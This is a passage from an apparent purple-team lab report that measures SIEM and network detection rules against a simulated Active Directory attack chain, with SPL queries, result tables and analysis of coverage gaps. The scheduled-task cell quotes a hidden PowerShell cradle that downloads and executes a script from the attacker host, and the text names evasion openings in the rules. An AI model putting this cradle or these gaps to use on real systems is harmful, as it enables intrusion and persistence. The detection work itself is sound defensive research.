(`Failure_Code=0x12` here is `KDC_ERR_CLIENT_REVOKED`, not to be confused with
`Ticket_Encryption_Type=0x12`, which is AES-256 and appears all over `#3` and `#4`. Same hex,
different field, opposite meaning.)

So one revoked attempt crossed the wire and was never written to the Windows log. It is a single
event inside a 160-millisecond burst, so a boundary or a dedup is possible and it is not claimed
as proven. But it is the same shape as the much larger gap in `#5` and the total one in `#11`,
and it is the pattern this lab has recorded before as
[the network seeing what the endpoint missed](../v3/README.md#findings): across three Kerberos
cells in this column, every discrepancy runs the same direction. **The wire holds more than the
log, never less.**

**The second pass caught itself making the same mistake this column has made twice.** Its first
Suricata query grouped by `alert.signature`, which is null for `flow` and `http` events, and
returned nothing — read at face value that is "Suricata is blind to the exfil", and it is false.
The corrected query shows Suricata recorded the transfer as `flow`, `http` and `fileinfo`, the
last meaning it captured the file itself. Third instance in this project of a query returning
empty for a reason that has nothing to do with the estate, now across two independent passes.
The pattern is the finding: **an empty result is a claim about a query until a control proves it
is a claim about the world.**

---

## Cell detail

### #2 — C2 Beacon from User-Writable Path, phase 5b: ✓ fires on both hosts

This cell had three ways to come out empty and only one of them would have been about the rule,
so the controls came first. The rule runs over the `Network_Traffic` CIM model rather than a raw
sourcetype, and this lab has already shipped a rule that queried a model which never received the
events it needed.

**Control: the telemetry exists.**

```
index=main sourcetype=XmlWinEventLog EventCode=3 earliest=-1d latest=now
| stats count values(DestinationIp) as dests by Image
| sort -count
```

`C:\Temp\GlobalProtect_Update.exe` — 12 events, every one to `192.168.182.133`. Sysmon has it.

**Control: the model holds the path in a form the rule's pattern matches.** The `app` values come
back as `C:\Temp\GlobalProtect_Update.exe` — single backslashes, ordinary case — so `*\\Temp\\*`
matches. No silent normalisation mismatch, which was the real risk.

**The rule, verbatim** (including the `where NOT` OneDrive allowlist, which an earlier run of this
measurement omitted — the first version returned every OneDrive row the shipped rule suppresses):

```
| tstats summariesonly=false allow_old_summaries=true count values(All_Traffic.dest_port) as dest_ports
    from datamodel=Network_Traffic.All_Traffic
    where (All_Traffic.app="*\\Temp\\*" OR All_Traffic.app="*\\AppData\\*" OR All_Traffic.app="*\\ProgramData\\*" OR All_Traffic.app="*\\Users\\Public\\*")
    by All_Traffic.src All_Traffic.dest All_Traffic.dest_port All_Traffic.app _time span=1m
| rename "All_Traffic.*" AS *
| where NOT (like(app,"%\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe")
      OR like(app,"%\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe")
      OR like(app,"%\\AppData\\Local\\Microsoft\\OneDrive\\%\\OneDrive.Sync.Service.exe"))
| stats count dc(_time) as beacons earliest(_time) as firstTime latest(_time) as lastTime by src dest dest_port app
```

| src | dest | port | app | beacons | window | verdict |
| --- | ---- | ---- | --- | ------- | ------ | ------- |
| SPIDERMAN | `-` | 443 | `C:\Temp\GlobalProtect_Update.exe` | 6 | 6 Nov 12:04–12:09 | **true positive** |
| THEPUNISHER | `-` | 443 | `C:\Temp\GlobalProtect_Update.exe` | 1 | 6 Nov 16:48 | **true positive** |
| THEPUNISHER | `-` | 443 | `OneDrive\Update\OneDriveSetup.exe` | 2 | 2 Nov | **false positive** |
| THEPUNISHER | akamai | 80 | `OneDrive\Update\OneDriveSetup.exe` | 1 | 2 Nov | **false positive** |
| SPIDERMAN | `-` | 8089 | `C:\Temp\nettest.exe` | 1 | 31 Oct | own test binary, outside the chain |

**The strongest corroboration in this column.** SPIDERMAN's window here, 12:04 to 12:09, matches
`#14`'s JA4 window of 12:04:15 to 12:09:15 to the minute — two independent telemetry paths,
Sysmon `EventCode=3` through the CIM model and Zeek's TLS handshakes, agreeing on the same beacon.
Six one-minute buckets against eleven handshakes is consistent: the handshakes cluster inside
those minutes.

**And the two C2 rules are complementary, which neither description says.** `#14` is silent on
THEPUNISHER because one TLS handshake cannot clear `count > 5`. `#2` has THEPUNISHER, because it
counts a process connecting from a user-writable path rather than a beacon interval. Together
they cover both endpoints; **neither covers both alone.** The after-run should be read with that
pairing in mind — a bundle that breaks one does not necessarily lose the host.

**The allowlist gap is a real defect, not noise.** The three allowlist entries cover
`OneDrive\OneDrive.exe`, `OneDrive\OneDriveStandaloneUpdater.exe` and
`OneDrive\<version>\OneDrive.Sync.Service.exe`. They do not cover
`OneDrive\Update\OneDriveSetup.exe`, which is a fourth OneDrive binary in a fourth directory
shape, and it fires. The allowlist was measured against the benign window and this binary did not
run in it — the same blindness that `#10` and `#15` both hit, for the third time in this column.

**`dest` is empty on every beacon row.** The model returns `-` where the destination belongs,
while Sysmon knows it is `192.168.182.133`. So the alert names the process, the port and the host
it ran on, and not the thing it was talking to. That is the same defect class as `#12`'s empty
columns: the rule fires, and what it hands the analyst is missing the field they will ask for
first.

### Phase 6 — Pass-the-Ticket: executed, and nothing in any layer alerts

No Splunk search covers this phase, so it has no numbered cell. It ran:

```
index=main source="WinEventLog:Security" EventCode=4768 Account_Name="SQLService" earliest=-1d latest=now
| table _time Account_Name Ticket_Encryption_Type Client_Address Result_Code
```

| `_time` | Account_Name | etype | Client_Address | Result_Code |
| ------- | ------------ | ----- | -------------- | ----------- |
| 6 Nov 12:21:45.874 | `SQLService` | **`0x17`** | `::ffff:192.168.182.138` | `0x0` |

A service account obtaining a TGT from a workstation, successfully, 33 minutes after its SPN was
roasted. `SQLService` has no reason to authenticate from SPIDERMAN at all; this is the cracked key
being used.

**The absence of coverage is already on record and honestly scored.** The
[ATT&CK Navigator layer](../detections/attack_navigator_layer.json) carries `T1550.003` at score
75, not 100, with the note that it was *"exercised and recorded during the run, but no rule for it
exists in `detections/`"*. That is the right call and this cell does not change it — it confirms
the gap is still open in v4, with a second data point.

The detection is not hard to state, which is what makes the gap worth naming: a `4768` for an
account that holds an SPN, sourced from a workstation rather than the host that runs the service.
It is not written here for the same reason as the other owed content — new detection between the
columns changes what the after column measures.

### Phase 7 — WinRM lateral movement: the rule's logic matches 6 of 7, and nothing alerts

[`v3_ndr.yml`](../detections/sigma/v3_ndr.yml) carries *WinRM Lateral Movement — East-West 5985*:
`id.resp_p: 5985`, `conn_state` in `SF`/`S1`/`OTH`, excluding `192.168.182.1`. The traffic:

| `_time` | orig_h → resp_h | conn_state | duration | bytes out | bytes **in** |
| ------- | --------------- | ---------- | -------- | --------- | ------------ |
| 12:23:39.312 | `.138` → `.137` | `SF` | 2.4 s | 24,670 | 11,336 |
| 12:23:39.961 | `.138` → `.137` | **`RSTO`** | 1.7 s | 11,528 | 6,100 |
| 12:23:40.770 | `.138` → `.137` | `SF` | 0.9 s | 17,306 | 5,515 |
| 12:23:41.625 | `.138` → `.137` | `SF` | 0.04 s | 2,556 | 341 |
| 16:24:38.964 | `.138` → `.137` | `SF` | 18.2 s | 123,226 | **6,594,812** |
| 16:24:39.202 | `.138` → `.137` | `SF` | 18.0 s | 11,841 | 7,015 |
| 16:24:39.560 | `.138` → `.137` | `SF` | 17.6 s | 17,758 | 5,515 |

SPIDERMAN to THEPUNISHER, workstation to workstation, which is exactly the pattern the rule's
description names from the v3 chain. Reproduced in v4.

**Six of seven match; the `RSTO` one does not**, because `RSTO` is not in the rule's `conn_state`
list. A connection the originator reset is still a connection that happened, so the rule
undercounts by one here. It does not miss the activity — six rows is not a marginal case — but the
omission is worth recording, because an attacker whose tooling resets its sessions would shrink
that count, and the rule has no floor that says how many it needs.

**The second burst is not a pivot, it is collection.** At 16:24 one session pulls **6.59 MB back**
to SPIDERMAN over WinRM, against 123 KB sent. Four hours after the initial pivot, over the same
channel, in the opposite direction. The volume rule `#15` does not see it: `#15` counts bytes
*out* of an internal host, and these bytes are internal-to-internal and inbound to the host that
asked for them. A 6.59 MB internal transfer is exactly the shape of staging before the exfil that
`#15` does catch an hour later.

**So the chain is visible end to end across layers, with its timing:**

| Time | Phase | Layer that has it |
| ---- | ----- | ----------------- |
| 11:48:12 | roast, `fcastle` → `SQLService` | Splunk `#4`, Suricata, Zeek |
| 12:21:45 | Pass-the-Ticket, `SQLService` TGT at RC4 | nothing alerts |
| 12:23:39 | WinRM pivot, SPIDERMAN → THEPUNISHER | Zeek rule |
| 16:24:38 | 6.59 MB pulled back over WinRM | nothing alerts |
| 17:27:09 | exfil to the C2 | Splunk `#15`, Zeek, Suricata |

Thirty-three minutes from roast to stolen ticket, two minutes from ticket to pivot. The two
unalerted steps sit in the middle, and both are the attacker *using* what the earlier steps
obtained.

### #3 — Kerberoasting RC4 Service Ticket, phase 4a: ✗ silent, by design

The rule verbatim returns nothing. The control says why, positively rather than by inference:

```
index=main source="WinEventLog:Security" EventCode=4769 earliest=-1d latest=now
| stats count values(Service_Name) as services by Ticket_Encryption_Type
```

| Ticket_Encryption_Type | count | services |
| ---------------------- | ----- | -------- |
| `0x12` | 125 | `HYDRA-DC$`, `SPIDERMAN$`, `SQLService`, `THEPUNISHER$`, `krbtgt` |

Every **service ticket** the KDC issued in the window is AES-256. Not one `0x17` in `4769`. The
roast was an AES roast, this rule keys on RC4 only, so its silence is the designed division of
labour with `#4` and not a gap. `#4` is the rule that has to catch this, and it does.

> **Corrected.** An earlier version of this cell read "not one `0x17`" and "no RC4 anywhere",
> which is false. The control above covers `4769` only, and **RC4 does exist in this estate's
> Kerberos traffic** — two `4768` TGTs carry `0x17`, one of them the Pass-the-Ticket above. The
> scoped claim is true and the general one was never measured; see `#13`, where the difference
> stops being a wording problem and becomes a defect.

### #4 — Kerberoasting User-SPN (etype-agnostic), phase 4a: ✓ fires

```
index=main source="WinEventLog:Security" EventCode=4769
    Service_Name!="krbtgt*" Service_Name!="*$" Account_Name!="*$" Account_Name!="*$@*"
    earliest=-1d latest=now
| stats count min(_time) as firstTime max(_time) as lastTime values(Ticket_Encryption_Type) as etypes
      by Client_Address Account_Name Service_Name
| where NOT (Account_Name="tstark@MARVEL.LOCAL" AND Service_Name="SQLService"
      AND (Client_Address="::ffff:192.168.182.137" OR Client_Address="::ffff:192.168.182.138"))
| eval firstTime=strftime(firstTime,"%F %T"), lastTime=strftime(lastTime,"%F %T")
```

| Client_Address | Account_Name | Service_Name | count | firstTime | etypes |
| -------------- | ------------ | ------------ | ----- | --------- | ------ |
| `::ffff:192.168.182.133` | `fcastle@MARVEL.LOCAL` | `SQLService` | 1 | 6 Nov 11:48:12 | `0x12` |

One row, and it is the roast: the attacker host requesting a service ticket for a user-held SPN,
AES-encrypted, which is exactly what `#3` cannot see.

**This cell also validates a design decision that was previously only argued.** The rule ships
with an identity allowlist suppressing `tstark` → `SQLService` from the two workstations, added
after the benign baseline. The
[2 November method revision](benign-baseline.md) chose `tstark` for the benign traffic precisely
so the allowlist would not blind the rule to the attack, and the attack ran as `fcastle` from
`.133`. Both halves held: the benign principal is suppressed, the attack principal is not. That
was a prediction about an allowlist's blast radius, and it is now a measurement.

The residual risk the rule's own description names is unchanged and worth restating here, because
this cell is the thing that could be mistaken for closing it: a stolen `tstark` credential used
from `.137` or `.138` still falls inside the allowlist and would be suppressed.

### #5 — Password Spray, phase 2: ✗ silent, one account below threshold

The rule verbatim returns nothing. The control gives the exact arithmetic:

```
index=main source="WinEventLog:Security" EventCode=4771 earliest=-1d latest=now
| stats count dc(Account_Name) as accounts values(Account_Name) as targets by Failure_Code Client_Address
```

| Failure_Code | Client_Address | count | accounts | targets |
| ------------ | -------------- | ----- | -------- | ------- |
| `0x18` | `192.168.182.133` | 14 | **4** | Administrator, SQLService, pparker, tstark |
| `0x12` | `192.168.182.133` | 4 | 1 | tstark |
| `0x25` | `::ffff:192.168.182.138` | 4 | 2 | Administrator, `SPIDERMAN$` |

The rule counts `0x18 OR 0xE` and needs `unique_users >= 5`. From the attacker host it gets four,
and there is no `0xE` at all — `Guest` supplied the fifth via `0xE` in the 20 October run and has
been disabled since. So the rule is silent by exactly one account, which is the condition already
written into its description from two earlier runs. Nothing new there.

**What is new is the size of the gap, and the four is not what it looks like.** Timestamped, the
`0x18` events separate into two sub-phases that the rule's five-minute bucket merges:

```
index=main source="WinEventLog:Security" EventCode=4771 Failure_Code="0x18" … src="192.168.182.133"
| table _time Account_Name | sort _time
```

| window | accounts | sub-phase |
| ------ | -------- | --------- |
| 11:32:00.913 – 11:32:01.425 | Administrator ×2, SQLService ×2, pparker ×2 | the spray — **3 distinct** |
| 11:32:05.983 – 11:32:05.996 | tstark ×8 | `bruteuser`, a separate action 4.5 s later |

**The spray on its own produces three countable accounts, not four.** The fourth is borrowed from
an adjacent attack that happens to land in the same bucket. And the `#11` cell measured two
unknown-principal errors in this same minute — `frankcastle` and `peterparker`, the long forms of
two accounts whose short forms exist — which produce no `4771` of any code because the principal
does not exist.

So: the spray touched at least six accounts, the rule can count three of them, it needs five, and
it reaches four only by absorbing a different attack. That is sharper than "the threshold is too
high for this estate". The attack was **larger** than the threshold and the telemetry reported it
smaller, and the undercount is not a constant — it grows with however many non-existent names the
attacker's wordlist contains, which is a number the defender does not control and cannot see from
Windows alone.

The threshold stays at 5. Detections are not tuned down to a lab's account count, and tuning one
to a number produced by an undercount would be worse than leaving it. What changes is that the
gap now has a measurement on both sides of it.

**This cell will read the same in the after column, and that is itself the result.** No hardening
bundle adds accounts to a spray or makes Windows log a non-existent principal, so `✗ silent`
before and `✗ silent` after is the honest prediction. It is recorded as a silent cell rather than
as `N/E` because the distinction matters: the phase ran, and the rule was measured against it.
`N/E` is reserved for phases that did not run. A rule that cannot be exercised in this estate and
a phase that was never executed produce the same empty table and mean entirely different things.

**But the estate detected this spray, and the Splunk column cannot show it.** Wazuh `60205`
fires at level 10 on the same minute — see
[the other three layers](#the-other-three-layers-measured-6-nov-2026). So the phase is covered
and this rule is not the thing covering it. Read as a Splunk cell, `✗ silent` is correct; read as
a coverage verdict, it would be wrong, and a single-source matrix offers no way to tell those
apart. That is the clearest argument in this document for the layer columns, and it came from the
layer the matrix had been leaving out.

**`60205` is more precise than a first reading of its name suggests, and this was measured rather
than assumed.** *Multiple Windows audit failure events* sounds like a rule that fires on noise.
It does not fire on this estate's noise, and the estate has a lot of it.

Over the 6 November window, with Wazuh verified alive and continuous — heartbeat at exactly 60
per hour, no gap — its parent rule `60104` fired 764 times, and the composition is the point:

| EventID | Count | Distribution | What it is |
| ------- | ----- | ------------ | ---------- |
| `4674` | 744 | **exactly 48 on every full hour**, flat | failed operation on a privileged object |
| `4771` | 20 | 4 at 09:00, 16 at 11:32 | the Kerberos failures, 16 of them the spray |

`60205` fired **twice, both at 11:00**, and not once across the 744 events of `4674`. So the
separation it makes is **burst against rate**: one failed privileged operation every seventy-five
seconds, forever, does not trigger it; sixteen pre-authentication failures in six seconds does.
That is the correct behaviour for a frequency rule and it is the opposite of noisy.

An earlier version of this cell called it "coverage by genericity, not precision". That was a
judgement from the rule's name and the measurement contradicts it. Corrected here rather than
quietly rewritten, because the wrong version is the more intuitive one.

**What is still missing is a full clean day, and it cannot be recovered.** The benign window
cannot supply it: Wazuh produced nothing from that window's start until 11:00 the next morning,
the wazuh-vm disk being full with `alerts.json` at zero bytes —
[documented in full in the baseline](benign-baseline.md), root cause and all, and independently
reproduced for this cell. The obvious next candidate was 4–5 November, and **the estate was
powered off**: Wazuh, the heartbeat and the Windows Security log all read zero for both days
entirely, with data resuming at 09:00 on 6 November.

So the support is: **zero false positives across roughly fifteen hours of verified-alive Wazuh
carrying 744 benign audit failures.** That is considerably stronger than the 7.5 quiet hours this
cell first claimed, and it is still not a full day with real user activity. The baseline closed
its Wazuh section with "Wazuh's own rules have no data for this window and are measured
separately"; this is that separate measurement, as far as existing data allows. The remainder
needs a fresh 24-hour idle run, which is an action rather than a query.

**A finding that fell out of the noise floor.** Something in this estate attempts a privileged
operation and fails 48 times an hour, continuously, on a timer — 744 events in the window, and no
rule in any layer looks at them. It is almost certainly an agent or a scheduled task, and it is
not interesting in itself. It is interesting as a **place to hide**: a real `4674` would land in a
constant stream nobody reads, and the only reason the number is known at all is that it had to be
quantified to price a different rule.

**One thing is unresolved and is left that way.** `kerbrute` reported seven logins tested. Six
are accounted for: one success (`fcastle`), two non-existent principals, three with `0x18`. All
fourteen `0x18` and all four `0x12` events from `.133` are allocated between the spray and
`bruteuser`, so the seventh login produced no `4771` this search can find. Not explained here
rather than explained badly.

The `0x12` row is tstark post-lockout (`KDC_ERR_CLIENT_REVOKED`), and the `0x25` row is clock skew
from SPIDERMAN, not the attack — it is the same skew that produces the false positive in `#6`.

### #6 — Spray Success, phase 2: ✓ fires, and one false positive

```
index=main source="WinEventLog:Security" (EventCode=4771 OR (EventCode=4768 Result_Code="0x0")) earliest=-1d latest=now
| eval src=replace(Client_Address,"^::ffff:","")
| transaction src maxspan=10m
| search eventcount>5 EventCode=4768 EventCode=4771
| table _time src Account_Name eventcount
```

| `_time` | src | Account_Name | eventcount | verdict |
| ------- | --- | ------------ | ---------- | ------- |
| 6 Nov 11:32:00 | `192.168.182.133` | Administrator, SQLService, fcastle, pparker, tstark | 19 | true positive |
| 6 Nov 09:29:43 | `192.168.182.138` | Administrator, `SPIDERMAN$` | 10 | **false positive** |

The first row is the attack, and this is the rule that carries phase 2 after `#5` goes quiet: it
correlates failures and a success from one source instead of counting distinct accounts, so the
undercount that silences `#5` does not silence this.

The second row is not. It is ninety minutes before the chain started at 11:03, it is SPIDERMAN
rather than the attacker host, and the accounts are a machine account and the local
Administrator. The control above shows four `0x25` failures — `KRB_AP_ERR_SKEW`, clock skew —
from that host for those two accounts, so what the rule has transacted is ordinary authentication
that failed on time drift, plus successful TGTs in the same ten-minute window, totalling more
than five events with both codes present. The rule's shape cannot distinguish that from a spray
followed by a success, because structurally it is the same shape.

**The false-positive row is directly observed; its composition is reconstructed** from the
`0x25` control rather than from the transaction's own contents, which the rule's `table` does not
output. That reconstruction accounts for 4 of the 10 events and infers the remaining 6 are
successful `4768`s. Worth stating as inference, and worth confirming before the fix is designed.

No change is made now. A fix would most likely exclude `0x25` from the failure side, which is a
one-line change to a rule in the middle of a before/after measurement, so it waits for step 8
with the others. Recorded here so the after-run column is read knowing this rule has a benign
firing mode that has nothing to do with hardening.

### #9 — Scheduled Task Persistence, phase 10: ✓ fires, 1 of 1

The rule verbatim returns one row:

| `_time` | host | Account_Name | Task_Name | task_command | task_runas |
| ------- | ---- | ------------ | --------- | ------------ | ---------- |
| 6 Nov 17:19:10 | THEPUNISHER | `frankcastle` | `\Updater` | `powershell.exe` | `S-1-5-18` |

with `task_args` carrying the cradle in full:
`-WindowStyle Hidden -c "IEX((New-Object Net.WebClient).DownloadString('http://192.168.182.133/update.ps1'))"`.

**Control: what the rule chose not to return.** Three `4698` events exist in the window.

```
index=main source="WinEventLog:Security" EventCode=4698 earliest=-1d latest=now
| rex "<Command>(?<task_command>[^<]+)</Command>"
| rex "<UserId>(?<task_runas>[^<]+)</UserId>"
| table _time host Account_Name Task_Name task_command task_runas
```

| host | Account_Name | Task_Name | task_command | task_runas | excluded by |
| ---- | ------------ | --------- | ------------ | ---------- | ----------- |
| THEPUNISHER | `frankcastle` | `\Updater` | `powershell.exe` | `S-1-5-18` | — (fires) |
| HYDRA-DC | `HYDRA-DC$` | Windows Defender Scheduled Scan | `MpCmdRun.exe` | `S-1-5-18` | `Account_Name!="*$"` |
| HYDRA-DC | `Administrator` | `\CreateExplorerShellUnelevatedTask` | `C:\Windows\Explorer.EXE` | `MARVEL\Administrator` | the `where` clause |

One true positive, two benign, both correctly rejected, and **by different mechanisms** — which is
what makes this a real negative test rather than an absence of noise. The Defender task runs as
`S-1-5-18` and would have satisfied `runas_system=1`; the only thing that stops it is
`Account_Name!="*$"`. The rule's own description calls that filter load-bearing rather than
hygiene, and this is it being load-bearing. The Explorer task passed the machine-account filter
and was rejected on the merits: not SYSTEM, no user-writable command path, no cradle.

**The v3 gap is closed, and measurably.** In v3 this task was caught only by the SYSTEM-runas
branch, because `<Command>` is `powershell.exe` and the whole cradle sits in `<Arguments>`, so
both path tests miss. The Arguments branch added afterwards now catches it too. Two independent
branches fire on the same row, which means the same task created in a user context — the case v3
noted would have walked through — is now covered. That was the point of the fix and this is the
first run where both branches had the chance to prove it.

The known evasion the rule leaves open on purpose is untouched by this cell: a command path
written as `%APPDATA%\evil.exe` still matches neither path branch, and the decision not to add an
environment-variable branch was measured and recorded rather than assumed.

### #10 — LSASS Access, phase 8: ✓ fires

Measured on 6 November and written up in full, including a false-positive source the benign
window could not contain, in
[the v4 README's before-run section](README.md#before-run-detection-measurement-6-nov-2026--two-cells-closed-and-a-false-positive-source-the-benign-window-could-not-see).
The attack row:

| Time | Host | SourceImage | GrantedAccess |
| ---- | ---- | ----------- | ------------- |
| 6 Nov 17:06:07 | THEPUNISHER | `notepad.exe` | `0x1f3fff` |

`SharpKatz` ran through Sliver's `execute-assembly`, which executes in a sacrificial process, so
the beacon path never appears as `SourceImage`. A cell written from a search for the beacon path
would have read as a miss while the rule had in fact fired.

### #11 — Kerbrute User Enumeration, phase 1: ✗ silent, structural

The rule, verbatim, over a window containing the enum:

```
index=main source="WinEventLog:Security" EventCode=4768 Result_Code="0x6" earliest=-1d latest=now
| bucket _time span=1m
| stats count dc(Account_Name) as unique_users by _time Client_Address
| where count > 50 AND unique_users > 20
```

No rows. On its own that is ambiguous — a rule returns nothing both when it cannot see an attack
and when no attack arrived — so two controls separate the cases.

**Control 1: the DC emits no `0x6` at all.**

```
index=main source="WinEventLog:Security" EventCode=4768 earliest=-1d latest=now
| stats count by Result_Code
```

| Result_Code | count |
| ----------- | ----- |
| `0x0` | 55 |

Fifty-five tickets in the window, every one of them a success. Not one `0x6`. The rule's
predicate can never be satisfied on this estate: Windows does not write a `4768` for a principal
that does not exist, with Failure auditing on or off, which `auditpol` confirmed separately.

**Control 2: the enum did arrive, and another layer has it.**

```
index=main sourcetype=zeek "KDC_ERR_C_PRINCIPAL_UNKNOWN" earliest=-1d latest=now
| rex field=source "/current/(?<log_file>[^/]+)"
| where log_file="kerberos.log"
| bucket _time span=1m
| stats count by _time
| sort _time
```

| `_time` | count | phase |
| ------- | ----- | ----- |
| 6 Nov 11:03 | 57 | enum |
| 6 Nov 11:32 | 2 | spray |

Fifty-nine unknown-principal errors on the wire, all from `192.168.182.133`. The 57 at 11:03
match the enum exactly — 58 names tried, one valid, 57 unknown — so the attack reached the KDC
and the KDC answered it. Windows recorded none of it.

**Verdict: `✗ silent`, and the reason is structural rather than a threshold.** Lowering
`count > 50 AND unique_users > 20` would change nothing, because the event the rule counts is
never written. This reproduces in v4 the v3 finding that
[Zeek recorded a spray attempt the Windows log never did](../v3/README.md#findings); the rule is
kept rather than deleted because it is correct against a KDC that does log `0x6`, and the cell is
the evidence that this one does not.

**And nothing acts on what Zeek sees.** This is the part the cell originally missed, and it turns
a corroboration into a gap. Zeek holds all 59 errors with the client principal on each, so the
evidence for enumeration is complete on the network side. The shipped Zeek content is three
rules in [`v3_ndr.yml`](../detections/sigma/v3_ndr.yml) — Kerberoasting on `zeek/kerberos`, WinRM
lateral movement on `zeek/conn`, and the JA4 beacon on `zeek/ssl`. **None keys on
`KDC_ERR_C_PRINCIPAL_UNKNOWN.`** So the one layer that can see this attack has no rule that fires
on it, and the only rule that exists watches a log the DC never writes.

**All four layers have since been measured, and the gap is worse than this cell first claimed.**
Wazuh is silent too — its built-in authentication-failure rules key on `4771`, which enumeration
never generates — and Suricata carries the `krb5` traffic with no alert on it. So: Windows cannot
see it, Wazuh cannot see it, Suricata sees it without saying anything, Zeek has every one of the
59 and nothing fires. **Of four detection layers, exactly one holds the evidence and none
alerts.** The earlier version of this cell inferred that from two layers; it is now measured
across all four, which turns a reasonable claim into a demonstrated one.

The fix is unusually cheap, which is what makes the omission worth recording: `zeek/kerberos` is
already a logsource in use by the roasting rule, so the gap is one more rule against a field
Zeek already parses, not new telemetry. It is **not** written now — adding detection content
between the before and after columns would change what the after column is measuring, the same
reason the five rule fixes are held. It goes in with step 8 and the after-run then has something
to measure.

Two further principals turn up in these 59 and are used by the `#5` cell: `frankcastle` and
`peterparker`, at 11:32, the long forms of two accounts whose short forms exist.

**A note for anyone re-running control 2.** It also returns one hit in `http.log` from
`192.168.182.1`, which is not evidence of anything: that is the browser running the Splunk search,
and the search string `KDC_ERR_C_PRINCIPAL_UNKNOWN` crossed the monitored segment inside the HTTP
request to Splunk Web on `:8000`. Zeek recorded the act of looking. Ignore it.

**Carried into the `#5` cell.** The two errors at 11:32 fall in the spray window, not the enum,
and they are accounts the spray touched that produce no `4771` at all. The `#5` rule counts
distinct accounts from `4771`, so its account count understates what the spray actually tried —
by exactly two here. That caveat was already written into the rule's description from the v3 case
file; this is the first time there is a number on it.

### #12 — Verify Account Lockout, phase 2: ✓ fires, and the output is unusable

This rule ships with `enableSched = 0`, so it has no triggered-alert history and an absent alert
would carry no information. Measured by running it:

```
index=main source="WinEventLog:Security" EventCode=4740 earliest=-1d latest=now
| table _time Target_User_Name Caller_Computer_Name
```

| `_time` | Target_User_Name | Caller_Computer_Name |
| ------- | ---------------- | -------------------- |
| 6 Nov 11:32:05.999 | *(empty)* | *(empty)* |
| 6 Nov 11:32:05.998 | *(empty)* | *(empty)* |

Two rows at the right moment — the lockout did happen and the rule did find it — and both
columns blank. An analyst receiving this alert learns that something was locked out and nothing
about what. **The defect has two separate causes and only one of them is the rule's fault.**

**`Target_User_Name` is the wrong field name.** The data is present, under three other names.
From the raw event:

| Field | Value |
| ----- | ----- |
| `Account_Locked_Out_Name` | `tstark` |
| `Account_Locked_Out_Security_ID` | `S-1-5-21-…-1110` |
| `user`, `src_user` | `tstark` |
| `Account_Name` | multivalue: `HYDRA-DC$`, `tstark` |

The Splunk Add-on for Windows extracts the locked-out principal as `Account_Locked_Out_Name`.
`Target_User_Name` is simply not a field this source produces, so the rule tables an empty column
where the entire point of the alert belongs. This is the third instance in this repo of a rule
keyed on a field whose name or format was guessed rather than read off the data — the
[Zeek Kerberoasting filter](../detections/sigma/v3_ndr.yml) and the `props.conf` sourcetype were
the first two. None of the three were found by reading the rule.

**`Caller_Computer_Name` is structurally empty and no field name would fix it.** The event's own
message ends with the label and no value:

```
Additional Information:
	Caller Computer Name:
```

Windows wrote the `4740` without populating it. So the rule is tabling a column that cannot hold
a value on this estate, and the consequence is worth naming: **`4740` alone cannot attribute a
lockout to a source.** The spray came from `192.168.182.133` and this event does not say so. That
attribution requires correlating with `4771`, which is what `#6` does — so the two rules are
complementary in a way that neither description states.

**One more thing an analyst would notice before anyone else does.** There are two events one
millisecond apart (`RecordNumber` 2319917 and 2319918) for the same account, so the alert shows
two rows for one lockout. Minor, but it is the kind of thing that erodes trust in a feed.

**The fix changed shape once the other layers were measured, and it is now cheaper.** Wazuh
`60115` — *user account locked out* — fires at level 9 on the same two events and carries the
field Splunk's extraction does not:

```
_time                    rule.level  targetUserName  eventID  subjectUserName
2026-11-06 11:32:06.953  9           tstark          4740     HYDRA-DC$
2026-11-06 11:32:06.941  9           tstark          4740     HYDRA-DC$
```

`data.win.eventdata.targetUserName` holds `tstark` outright. So the estate already has the
locked-out account on an alerting path; what it lacks is the routing. The owed work stops being
"repair the Splunk extraction" and becomes **"take the lockout alert from the layer that already
names the account"**, which touches no Splunk rule and therefore does not disturb the before/after
comparison at all.

That is the clearest operational return in this column from reading more than one layer, and it
only appeared because the two were compared. Neither cell says it alone: Splunk's says the field
is empty, Wazuh's says a lockout fired. The useful sentence is in the gap between them.

The original fix — `Account_Locked_Out_Name` in place of `Target_User_Name`, and
`Caller_Computer_Name` dropped — is still correct and still held for step 8, but it is now the
fallback rather than the plan.

### #13 — RC4 Anomaly, phase 4a: ✗ silent, nothing to anomaly on yet

```
index=main source="WinEventLog:Security" EventCode=4769 Ticket_Encryption_Type="0x17" earliest=-1d latest=now
| stats count by Service_Name Ticket_Encryption_Type
```

No rows: 125 service tickets in the window, all `0x12`. And that result is correct, uninformative,
and hiding a defect — because **RC4 is in this estate right now and this rule is pointed at the
wrong event.**

**The rule reads `4769`. The RC4 is in `4768`:**

```
index=main source="WinEventLog:Security" EventCode=4768 earliest=-1d latest=now
| stats count values(Ticket_Encryption_Type) as etypes values(Client_Address) as src by Account_Name
```

| Account_Name | count | etypes | src |
| ------------ | ----- | ------ | --- |
| `HYDRA-DC$` | 23 | `0x12` | `::1` |
| `Administrator` | 12 | `0x12` | `::1`, `.137`, `.138` |
| `SPIDERMAN$` | 9 | `0x12` | `.138` |
| `THEPUNISHER$` | 8 | `0x12` | `.137` |
| `fcastle` | 2 | **`0x12` and `0x17`** | `.133` |
| `SQLService` | 1 | **`0x17`** | `.138` |

Two RC4 tickets, both on the attack path, neither visible to this rule at any threshold — it
queries ticket-granting-service events and these are ticket-granting-ticket events. Timestamped:

| `_time` | Account | etype | What it is |
| ------- | ------- | ----- | ---------- |
| 11:32:01.111 | `fcastle` | `0x12` | TGT from the spray success |
| **11:48:12.502** | `fcastle` | **`0x17`** | **the TGT `GetUserSPNs` asked for** |
| **12:21:45.874** | `SQLService` | **`0x17`** | the Pass-the-Ticket |

**The roast obtained an RC4 TGT eleven milliseconds before the AES service ticket that `#4`
catches.** Same tool, same transaction, same second. `impacket` requested RC4 for its own TGT as a
matter of course and the KDC issued it; the TGS then came back AES because `GetUserSPNs` requested
no particular etype for it and the KDC chose the strongest shared one. That second half is
[already documented](../detections/splunk/purple_lab/default/savedsearches.conf) in `#3`'s own
description. The first half — that the roast's TGT was RC4 — is new here, and it means the
RC4 evidence was eleven milliseconds away from the rule that did fire.

**So the coverage is inverted relative to the risk.** This domain issued RC4 to an attacker twice.
The rule for etype-agnostic roasting caught the AES ticket. The rule named *RC4 Anomaly* caught
neither RC4 ticket, and will not after enforcement either, because the message type it reads is
not the one RC4 arrives in. The weaker cryptography is the uncovered half.

It also puts a second data point under a v3 conclusion: this domain **prefers** AES rather than
